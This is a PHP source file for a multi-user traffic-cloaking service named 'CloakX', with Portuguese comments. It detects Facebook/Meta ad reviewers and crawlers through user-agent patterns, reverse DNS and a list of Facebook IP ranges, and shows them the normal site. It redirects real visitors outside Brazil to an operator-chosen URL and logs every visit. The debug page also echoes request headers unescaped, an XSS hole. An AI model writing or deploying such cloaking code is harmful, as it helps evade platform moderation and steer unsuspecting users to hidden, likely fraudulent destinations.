<?php
ob_start();

// Inclui o autoloader do Composer para carregar a biblioteca GeoIP2
require __DIR__ . '/vendor/autoload.php';

// Inclui a conexão com o banco de dados
require __DIR__ . '/conexao.php';

use GeoIp2\Database\Reader;

// ============================================
// CAPTURAR TOKEN DO USUÁRIO DA URL
// ============================================
$user_token = isset($_GET['key']) ? trim($_GET['key']) : '';

// ============================================
// BUSCAR DADOS DO USUÁRIO E DOMÍNIO NO BANCO
// ============================================
$usuario_id = null;
$url_redirecionamento = null;
// Detectar domínio de origem (de onde o código foi instalado)
$dominio_atual = '';
if (!empty($_SERVER['HTTP_REFERER'])) {
    $parsed = parse_url($_SERVER['HTTP_REFERER']);
    $dominio_atual = $parsed['host'] ?? '';
} elseif (!empty($_SERVER['HTTP_HOST'])) {
    // Fallback: se não tiver referer, usar o host (pode acontecer em testes diretos)
    $dominio_atual = $_SERVER['HTTP_HOST'];
}
$dominio_id = null;

if (!empty($user_token)) {
    // Buscar usuário pelo token
    $sql = "SELECT id FROM usuarios WHERE token = ? LIMIT 1";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $user_token);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $usuario_data = $result->fetch_assoc();
        $usuario_id = $usuario_data['id'];
        
        // Buscar ou criar domínio
        $sql_dominio = "SELECT id, url_redirecionamento, ativo FROM dominios WHERE usuario_id = ? AND dominio = ? LIMIT 1";
        $stmt_dominio = $conn->prepare($sql_dominio);
        $stmt_dominio->bind_param("is", $usuario_id, $dominio_atual);
        $stmt_dominio->execute();
        $result_dominio = $stmt_dominio->get_result();
        
        if ($result_dominio->num_rows > 0) {
            // Domínio já existe
            $dominio_data = $result_dominio->fetch_assoc();
            $dominio_id = $dominio_data['id'];
            $url_redirecionamento = $dominio_data['url_redirecionamento'];
            $dominio_ativo = $dominio_data['ativo'];
            
            // Se domínio está inativo, não redirecionar
            if (!$dominio_ativo) {
                $url_redirecionamento = null;
            }
        } else {
            // Criar novo domínio automaticamente
            $sql_insert = "INSERT INTO dominios (usuario_id, dominio, ativo) VALUES (?, ?, 1)";
            $stmt_insert = $conn->prepare($sql_insert);
            $stmt_insert->bind_param("is", $usuario_id, $dominio_atual);
            $stmt_insert->execute();
            $dominio_id = $stmt_insert->insert_id;
            $url_redirecionamento = null; // Ainda não configurado
        }
    }
}

// ============================================
// FUNÇÕES AUXILIARES
// ============================================

function ip_in_range($ip, $range) {
    if (strpos($range, '/') === false) $range .= '/32';
    [$subnet, $bits] = explode('/', $range);
    return (ip2long($ip) & ~((1 << (32 - $bits)) - 1)) === (ip2long($subnet) & ~((1 << (32 - $bits)) - 1));
}

function is_bot_or_spy($ua, $ip, $ref) {
    $host = gethostbyaddr($ip);

    $patterns = [
        'facebookexternalhit', 'Facebot', 'facebookcatalog', 'Meta',
        'AdsBot', 'adlibrary', 'crawler', 'WhatsApp', 'TelegramBot',
        'Slackbot', 'Discordbot', 'Googlebot', 'bingbot'
    ];

    $facebook_ips = [
        '31.13.0.0/16', '66.220.144.0/20', '69.63.176.0/20',
        '69.171.224.0/19', '129.134.0.0/16', '157.240.0.0/16',
        '173.252.64.0/18', '179.60.192.0/22', '185.60.216.0/22',
        '204.15.20.0/22'
    ];

    foreach ($facebook_ips as $range) {
        if (ip_in_range($ip, $range)) return true;
    }

    foreach ($patterns as $p) {
        if (
            stripos($ua, $p) !== false ||
            stripos($host, 'facebook') !== false ||
            stripos($ref, 'facebook.com/ads') !== false
        ) {
            return true;
        }
    }

    return false;
}

function get_country($ip) {
    $databaseFile = __DIR__ . '/GeoLite2-Country.mmdb';

    if (!file_exists($databaseFile)) {
        return '';
    }

    try {
        $reader = new Reader($databaseFile);
        $record = $reader->country($ip);
        return $record->country->isoCode ?? '';
    } catch (\Exception $e) {
        return '';
    }
}

// ============================================
// FUNÇÃO DE LOG (ARQUIVO + BANCO DE DADOS)
// ============================================
function log_access($ip, $ua, $status, $path = '/', $token = '', $country = '', $dominio_id = null, $usuario_id = null, $conn = null) {
    // Log em arquivo
    $utm_parts = [];
    foreach (["utm_source", "utm_campaign", "utm_medium", "utm_content", "utm_term"] as $k) {
        if (!empty($_GET[$k])) {
            $utm_parts[] = "$k={$_GET[$k]}";
        }
    }
    $utm = implode(' | ', $utm_parts);
    
    $log_line = sprintf("[%s] TOKEN: %s | IP: %s | Localização: %s | Status: %s | UA: %s | Path: %s\n",
        date('Y-m-d H:i:s'), 
        $token ?: 'NO_TOKEN', 
        $ip, 
        $country, 
        $status, 
        $ua, 
        $path
    );
    
    if (!is_dir(__DIR__ . '/logs')) {
        mkdir(__DIR__ . '/logs', 0777, true);
    }
    file_put_contents(__DIR__ . '/logs/access.log', $log_line, FILE_APPEND);
    
    // Log no banco de dados (se disponível)
    if ($conn && $dominio_id && $usuario_id) {
        try {
            // Inserir log detalhado
            $sql_log = "INSERT INTO dominio_logs (dominio_id, usuario_id, ip, pais, status, user_agent, referrer) VALUES (?, ?, ?, ?, ?, ?, ?)";
            $stmt_log = $conn->prepare($sql_log);
            $referrer = $_SERVER['HTTP_REFERER'] ?? '';
            $stmt_log->bind_param("iisssss", $dominio_id, $usuario_id, $ip, $country, $status, $ua, $referrer);
            $stmt_log->execute();
            
            // Atualizar estatísticas do dia
            $data_hoje = date('Y-m-d');
            
            // Verificar se já existe registro para hoje
            $sql_check = "SELECT id FROM dominio_visitas WHERE dominio_id = ? AND data = ? LIMIT 1";
            $stmt_check = $conn->prepare($sql_check);
            $stmt_check->bind_param("is", $dominio_id, $data_hoje);
            $stmt_check->execute();
            $result_check = $stmt_check->get_result();
            
            if ($result_check->num_rows > 0) {
                // Atualizar estatísticas existentes
                $sql_update = "UPDATE dominio_visitas SET total_acessos = total_acessos + 1";
                
                if (stripos($status, 'BOT') !== false) {
                    $sql_update .= ", bots_bloqueados = bots_bloqueados + 1";
                } elseif (stripos($status, 'BRASIL') !== false || stripos($status, 'SITE NORMAL') !== false) {
                    $sql_update .= ", humanos_br = humanos_br + 1";
                } elseif (stripos($status, 'REDIRECIONADO') !== false) {
                    $sql_update .= ", humanos_internacional = humanos_internacional + 1";
                }
                
                $sql_update .= " WHERE dominio_id = ? AND data = ?";
                $stmt_update = $conn->prepare($sql_update);
                $stmt_update->bind_param("is", $dominio_id, $data_hoje);
                $stmt_update->execute();
            } else {
                // Criar novo registro de estatísticas
                $total = 1;
                $bots = 0;
                $br = 0;
                $internacional = 0;
                
                if (stripos($status, 'BOT') !== false) {
                    $bots = 1;
                } elseif (stripos($status, 'BRASIL') !== false || stripos($status, 'SITE NORMAL') !== false) {
                    $br = 1;
                } elseif (stripos($status, 'REDIRECIONADO') !== false) {
                    $internacional = 1;
                }
                
                $sql_insert = "INSERT INTO dominio_visitas (dominio_id, usuario_id, total_acessos, bots_bloqueados, humanos_br, humanos_internacional, data) VALUES (?, ?, ?, ?, ?, ?, ?)";
                $stmt_insert = $conn->prepare($sql_insert);
                $stmt_insert->bind_param("iiiiiss", $dominio_id, $usuario_id, $total, $bots, $br, $internacional, $data_hoje);
                $stmt_insert->execute();
            }
        } catch (Exception $e) {
            // Silenciar erros de banco de dados para não quebrar o cloaking
            error_log("Erro ao registrar log no banco: " . $e->getMessage());
        }
    }
}

// ============================================
// LÓGICA PRINCIPAL DE CLOAKING
// ============================================

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';
$path = $_SERVER['REQUEST_URI'] ?? '/';
$cookie_set = isset($_COOKIE['real_user']);
$country = get_country($ip);

// Modo debug
if (isset($_GET['debug'])) {
    echo "<h1>DEBUG MODE - CloakX</h1>";
    echo "<strong>IP:</strong> $ip<br>";
    echo "<strong>País:</strong> " . ($country ?: 'DESCONHECIDO') . "<br>";
    echo "<strong>User Agent:</strong> $ua<br>";
    echo "<strong>Cookie:</strong> " . ($cookie_set ? 'SIM' : 'NÃO') . "<br>";
    echo "<strong>Token:</strong> " . ($user_token ?: 'NÃO FORNECIDO') . "<br>";
    echo "<strong>Usuário ID:</strong> " . ($usuario_id ?: 'NÃO ENCONTRADO') . "<br>";
    echo "<strong>URL Redirecionamento:</strong> " . ($url_redirecionamento ?: 'NÃO CONFIGURADO') . "<br>";
    echo "<strong>Domínio:</strong> " . $dominio_atual . "<br>";
    echo "<strong>É Bot?</strong> " . (is_bot_or_spy($ua, $ip, $ref) ? 'SIM' : 'NÃO') . "<br><hr>";
    echo "<h2>Comportamento do Sistema:</h2>";
    echo "<ul>";
    echo "<li><strong>Bots:</strong> Site normal (sem bloqueio)</li>";
    echo "<li><strong>Brasil:</strong> Site normal (sem redirecionamento)</li>";
    echo "<li><strong>Fora do Brasil:</strong> Redirecionamento para URL configurada</li>";
    echo "</ul>";
    exit;
}

// Verificar cookie de usuário real
if (!$cookie_set) {
    echo '<script>document.cookie = "real_user=1; path=/"; location.reload();</script>';
    exit;
}

// Detectar se é bot
$is_bot = is_bot_or_spy($ua, $ip, $ref);

// Se for bot, registrar e deixar passar (ver site normal)
if ($is_bot) {
    log_access($ip, $ua, 'BOT - SITE NORMAL', $path, $user_token, $country, $dominio_id, $usuario_id, $conn);
    // NÃO FAZ NADA - Deixa o site carregar normalmente
    exit;
}

// Se for do Brasil ou país desconhecido - DEIXAR PASSAR (VER SITE NORMAL)
if ($country === 'BR' || empty($country)) {
    log_access($ip, $ua, 'BRASIL - SITE NORMAL', $path, $user_token, $country, $dominio_id, $usuario_id, $conn);
    // NÃO FAZ NADA - Deixa o site carregar normalmente
    exit;
}

// Se for de fora do Brasil e tem URL configurada - REDIRECIONAR
if (!empty($url_redirecionamento)) {
    log_access($ip, $ua, 'INTERNACIONAL - REDIRECIONADO', $path, $user_token, $country, $dominio_id, $usuario_id, $conn);
    header("Location: " . $url_redirecionamento);
    exit;
} else {
    // Se não tem URL configurada - DEIXAR PASSAR (VER SITE NORMAL)
    log_access($ip, $ua, 'INTERNACIONAL - SITE NORMAL (SEM URL)', $path, $user_token, $country, $dominio_id, $usuario_id, $conn);
    // NÃO FAZ NADA - Deixa o site carregar normalmente
    exit;
}
?>
